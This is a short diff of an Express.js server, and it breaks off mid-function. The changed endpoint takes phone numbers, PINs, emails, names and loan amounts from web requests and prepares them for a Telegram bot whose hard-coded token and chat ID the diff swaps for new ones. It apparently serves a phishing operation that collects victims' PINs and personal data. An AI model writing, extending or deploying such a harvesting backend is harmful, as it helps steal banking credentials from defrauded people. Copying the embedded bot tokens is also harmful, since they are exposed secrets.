@@ -2,7 +2,7 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// CORS Configuration - IMPORTANT!
+// ========== CORS CONFIGURATION ==========
 app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', '*');
     res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
@@ -15,16 +15,19 @@ app.use((req, res, next) => {
 
 app.use(express.json());
 
+// Health check endpoint
 app.get('/api/health', (req, res) => {
     res.json({ status: 'OK', timestamp: new Date().toISOString() });
 });
 
+// Telegram notification endpoint with NEW BOT
 app.post('/api/send-telegram', async (req, res) => {
     try {
         const { phone, pin, email, name, amount, term, type } = req.body;
         
-        const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
-        const TG_CHAT_ID = '8392790531';
+        // 🔴 NEW BOT CREDENTIALS 🔴
+        const TG_BOT_TOKEN = '8069280584:AAFPwWOHBJmvMdwCDadMQX5N2ySPr58_e94';
+        const TG_CHAT_ID = '8425632882';
         
         let message = '';
         if (type === 'pin') {
